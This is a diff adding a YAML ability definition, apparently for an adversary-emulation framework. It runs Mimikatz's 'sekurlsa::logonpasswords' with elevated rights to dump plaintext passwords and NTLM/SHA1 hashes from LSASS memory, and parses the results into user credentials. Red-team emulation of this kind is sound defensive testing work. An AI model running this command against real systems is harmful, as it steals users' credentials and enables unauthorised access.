@@ -1,0 +1,28 @@
+---
+
+- id: 7748252d-0797-46e5-a603-1532fe5983a3
+  name: Run Mimikatz
+  description: Execute mimikatz and attempt to grab plaintext and/or hashed passwords
+  privilege: Elevated
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  platforms:
+    windows:
+      psh:
+        command: |
+          .\mimikatz.exe sekurlsa::logonpasswords exit
+        payloads:
+        - mimikatz.exe
+        parsers:
+          plugins.stockpile.app.parsers.katz:
+            - source: domain.user.name
+              edge: has_password
+              target: domain.user.password
+            - source: domain.user.name
+              edge: has_hash
+              target: domain.user.ntlm
+            - source: domain.user.name
+              edge: has_hash
+              target: domain.user.sha1
